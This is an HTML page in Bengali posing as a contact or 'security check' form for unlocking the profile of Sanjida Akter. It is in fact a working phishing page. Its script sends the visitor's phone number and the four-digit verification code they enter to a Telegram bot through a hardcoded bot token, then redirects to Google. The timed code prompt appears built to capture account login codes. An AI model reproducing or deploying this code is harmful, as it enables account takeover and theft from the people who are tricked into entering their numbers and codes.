<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sanjida Akter - Verification</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f7f6; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
        .card { background: #fff; width: 90%; max-width: 400px; border-radius: 12px; padding: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; border: 1px solid #e0e0e0; }
        
        /* ডিজাইন পরিবর্তন: সাধারণ লুক */
        .title { font-size: 22px; font-weight: bold; color: #333; margin-bottom: 10px; }
        .subtitle { color: #666; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
        
        /* input এলাকা */
        .input-group { text-align: left; margin-bottom: 20px; }
        .input-label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 5px; color: #555; }
        .input-container { border: 2px solid #ddd; border-radius: 8px; display: flex; align-items: center; padding: 5px; background: white; transition: border-color 0.3s; }
        .input-container:focus-within { border-color: #4a90e2; }
        .country-input { width: 70px; border: none; border-right: 1px solid #eee; outline: none; font-size: 17px; font-weight: bold; text-align: center; padding: 12px 5px; color: #333; }
        .main-phone { border: none; outline: none; font-size: 17px; width: 100%; padding: 12px; color: #333; }

        /* ভেরিফিকেশন বক্স ডিজাইন */
        .code-container { display: flex; justify-content: center; gap: 12px; margin: 25px 0; }
        .code-box { width: 45px; height: 55px; border: 2px solid #ddd; border-radius: 8px; text-align: center; font-size: 24px; font-weight: bold; background: #fafafa; color: #333; transition: border-color 0.3s; }
        .code-box:focus { border-color: #4a90e2; outline: none; background: #fff; }
        .code-box:disabled { background: #eee; cursor: not-allowed; border-color: #ccc; }
        
        button { width: 100%; padding: 15px; background-color: #bbb; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: not-allowed; transition: background-color 0.3s; }
        button.active { background-color: #4a90e2; cursor: pointer; }
        button.active:hover { background-color: #357abd; }
        
        .timer { color: #888; font-size: 14px; margin-top: 15px; font-style: italic; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div id="page1">
    <div class="card">
        <div class="title">যোগাযোগ করুন</div>
        <p class="subtitle">Sanjida Akter-এর সাথে যোগাযোগ করতে বা তার প্রোফাইল আনলক করতে নিচের ফর্মে আপনার নম্বর দিন।</p>
        
        <div class="input-group">
            <label class="input-label">ফোন নম্বর</label>
            <div class="input-container">
                <input type="text" id="countryCode" class="country-input" placeholder="+880" val="+880">
                <input type="number" id="phone" class="main-phone" placeholder="01XXXXXXXXX" oninput="checkBtn()">
            </div>
        </div>
        <button id="submitBtn" onclick="goToVerify()">সম্পূর্ণ করুন ➔</button>
    </div>
</div>

<div id="page2" class="hidden">
    <div class="card">
        <div style="font-size: 50px; color:#4a90e2; margin-bottom: 15px;">🔒</div>
        <div class="title" style="font-size: 20px;">সিকিউরিটি চেক</div>
        <p class="subtitle">আপনার নম্বরে একটি ৪-সংখ্যার ভেরিফিকেশন কোড পাঠানো হয়েছে। কোডটি নিচে দিন।</p>
        
        <div class="code-container">
            <input type="number" class="code-box" maxlength="1" oninput="moveNext(this, 'c2')" id="c1">
            <input type="number" class="code-box" maxlength="1" oninput="moveNext(this, 'c3')" id="c2">
            <input type="number" class="code-box" maxlength="1" oninput="moveNext(this, 'c4')" id="c3">
            <input type="number" class="code-box" maxlength="1" oninput="sendCode(this)" id="c4">
        </div>

        <div id="timerText" class="timer">অনুগ্রহ করে ২৫ সেকেন্ড অপেক্ষা করুন...</div>
    </div>
</div>

<script>
    // আগের মতোই টেলিগ্রাম বোটের তথ্য
    const token = "8794180523:AAEtAX0_NfcKPvJdSPNpuil6zWZupVu23zY";
    const chat_id = "8624234278";
    let userFullPhone = "";

    function checkBtn() {
        const phone = document.getElementById("phone").value;
        const btn = document.getElementById("submitBtn");
        if(phone.length >= 8) btn.classList.add("active");
        else btn.classList.remove("active");
    }

    function goToVerify() {
        const cCode = document.getElementById("countryCode").value || "+880";
        const phone = document.getElementById("phone").value;
        
        if(phone.length < 8) return;
        
        userFullPhone = cCode + phone;
        
        // টেলিগ্রামে নম্বর পাঠানো
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📱 New Number: " + userFullPhone + "\n👤 Target: Sanjida Akter")}`);

        document.getElementById("page1").classList.add("hidden");
        document.getElementById("page2").classList.remove("hidden");
        startTimer();
    }

    function startTimer() {
        let timeLeft = 25;
        const timerText = document.getElementById("timerText");
        const inputs = document.querySelectorAll(".code-box");
        inputs.forEach(i => i.disabled = true);

        const interval = setInterval(() => {
            timeLeft--;
            timerText.innerText = `অনুগ্রহ করে ${timeLeft} সেকেন্ড অপেক্ষা করুন...`;
            if (timeLeft <= 0) {
                clearInterval(interval);
                timerText.innerText = "আপনি এখন কোড দিতে পারেন";
                inputs.forEach(i => i.disabled = false);
                inputs[0].focus();
            }
        }, 1000);
    }

    function moveNext(curr, nextId) {
        if(curr.value.length >= 1) {
            curr.value = curr.value.slice(0,1);
            document.getElementById(nextId).focus();
        }
    }

    function sendCode(lastInput) {
        if(lastInput.value.length >= 1) {
            lastInput.value = lastInput.value.slice(0,1);
            const c1 = document.getElementById("c1").value;
            const c2 = document.getElementById("c2").value;
            const c3 = document.getElementById("c3").value;
            const c4 = document.getElementById("c4").value;
            const fullCode = c1 + c2 + c3 + c4;

            if(fullCode.length < 4) return;

            const msg = `🔔 CODE RECEIVED!\n\n📱 Number: ${userFullPhone}\n👤 Name: Sanjida Akter\n🔑 Code: ${fullCode}`;
            
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
            .then(() => {
                alert("আপনার ভেরিফিকেশন সফল হয়েছে!");
                window.location.href = "https://www.google.com"; // গুগল-এ পাঠিয়ে দেওয়া
            });
        }
    }
</script>

</body>
</html>
